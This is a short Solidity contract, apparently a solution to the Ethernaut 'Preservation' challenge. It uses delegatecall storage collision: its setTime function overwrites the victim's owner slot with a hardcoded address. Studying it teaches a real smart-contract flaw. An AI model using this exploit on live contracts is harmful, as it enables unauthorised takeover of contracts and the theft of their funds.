// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationHack {
    address public unused;
    address public unused2;
    address public ownerHack;
    address public targetOwner;

    constructor() {
        targetOwner = msg.sender;
    }

    function setTime(uint256) public {
        ownerHack = address(0x193cA786e7C7CC67B6227391d739E41C43AF285f);
    }
}
